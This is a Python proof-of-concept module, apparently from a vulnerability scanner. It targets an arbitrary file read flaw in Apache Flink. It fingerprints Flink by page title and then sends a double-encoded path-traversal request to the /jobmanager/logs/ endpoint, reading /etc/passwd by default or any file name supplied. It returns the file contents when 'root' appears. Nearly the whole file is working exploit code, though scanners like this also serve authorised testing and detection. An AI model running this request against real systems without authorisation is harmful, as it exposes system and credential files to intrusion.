# -*- coding:utf-8 -*-
# Apache Flink 任意文件读取

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from vulscan_Project.requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan = None):
        self.service = service
        self.requestUtil = Requests(service.cookies)

    def flink_file_poc(self, url, filename="/etc/passwd", type="poc"):
        resp = self.requestUtil.get(
            url + "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f" + filename.replace(
                "/", "%252f"))
        print(resp.text)
        if type == "poc":
            if "root" in resp.text:
                return resp.text
        else:
            return resp.text

    def fingerprint(self):
        try:
            if "Apache Flink" in self.service.title:
                return True
        except:
            return False

    def poc(self):
        try:
            result = self.flink_file_poc(self.service.url)
            if result:
                return ["Apache Flink 任意文件读取",
                        "<b>/etc/passwd</b>: <br>" + "<br>".join(result.split("\n")[:2]) + "<br>..."]
        except:
            return []
